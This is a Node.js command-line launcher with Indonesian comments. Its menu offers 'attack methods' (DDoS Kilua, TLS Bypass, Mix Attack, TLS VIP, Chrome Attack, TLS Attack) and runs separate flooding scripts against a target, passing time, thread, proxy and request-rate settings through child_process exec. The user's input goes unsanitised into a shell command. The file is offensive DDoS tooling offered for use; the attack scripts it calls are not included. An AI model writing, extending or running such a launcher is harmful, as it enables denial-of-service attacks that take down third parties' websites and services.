const { exec } = require('child_process');
const readline = require('readline');

// Fungsi untuk membersihkan layar
function clearScreen() {
    process.stdout.write('\033c');
}

// Fungsi untuk menampilkan menu utama
function mainMenu() {
    clearScreen(); // Bersihkan layar setiap kali menu ditampilkan
    console.log("\n=== Pilih Metode Serangan ===");
    console.log("1. DDOS Kilua");
    console.log("2. TLS Bypass");
    console.log("3. Mix Attack");
    console.log("4. TLS VIP");
    console.log("5. Chrome Attack");
    console.log("6. TLS Attack");
    console.log("7. Exit");

    const rl = readline.createInterface({
        input: process.stdin,
        output: process.stdout
    });

    rl.question('\nMasukkan nomor pilihan: ', (choice) => {
        switch (choice.trim()) {
            case '1':
                executeCommand(rl, 'node kilua.js', '<TARGET> <TIME> <THREAD> <PROXY> <RATE> <MODE>');
                break;
            case '2':
                executeCommand(rl, 'node tls-bypass.js', '<URL> <TIME> <REQ_PER_SEC> <THREADS>');
                break;
            case '3':
                executeCommand(rl, 'node mix.js', '<HOST> <TIME> <RPS> <THREADS>');
                break;
            case '4':
                executeCommand(rl, 'node tlsvip.js', '<TARGET> <TIME> <THREAD> <PROXY>');
                break;
            case '5':
                executeCommand(rl, 'node chromev3.js', '<TARGET> <TIME> <THREAD>');
                break;
            case '6':
                executeCommand(rl, 'node tls.js', '<TARGET> <TIME> <REQ_PER_SEC> <THREADS>');
                break;
            case '7':
                console.log("Keluar dari program.");
                rl.close();
                process.exit(0);
            default:
                console.log("\nPilihan tidak valid. Silakan coba lagi.");
                rl.close();
                mainMenu();
        }
    });
}

// Fungsi untuk mengeksekusi command dengan parameter
function executeCommand(rl, command, format) {
    console.log(`\nAnda memilih: ${command}`);
    console.log(`Silakan masukkan parameter dengan format:`);
    console.log(`${command} ${format}`);

    rl.question('\nMasukkan parameter: ', (params) => {
        if (validateParameters(params)) {
            const fullCommand = `${command} ${params}`;
            console.log(`\nMenjalankan: ${fullCommand}`);
            runCommand(fullCommand, rl);
        } else {
            console.log("\nParameter tidak valid. Pastikan sesuai format.");
            console.log(`Contoh: ${command} ${format}`);
            rl.close();
            mainMenu();
        }
    });
}

// Validasi parameter
function validateParameters(params) {
    return params.split(' ').length >= 3; // Minimal 3 argumen
}

// Fungsi untuk menjalankan perintah tanpa pesan peringatan
function runCommand(command, rl) {
    const process = exec(command);

    process.stdout.on('data', (data) => {
        if (!data.includes('warning')) {
            console.log(data);
        }
    });

    process.stderr.on('data', (data) => {
        if (!data.includes('warning')) {
            console.error(data); // Abaikan peringatan
        }
    });

    process.on('close', (code) => {
        console.log(`Proses selesai dengan kode: ${code}`);
        rl.close();
        mainMenu();
    });

    process.on('error', (err) => {
        console.error(`Proses gagal dijalankan: ${err.message}`);
        rl.close();
        mainMenu();
    });
}

// Penanganan Kesalahan Global
process.on('uncaughtException', (err) => {
    console.error("Kesalahan tak terduga:", err.message);
});

process.on('unhandledRejection', (reason) => {
    console.error("Kesalahan janji yang tidak ditangani:", reason);
});

// Jalankan menu utama
mainMenu();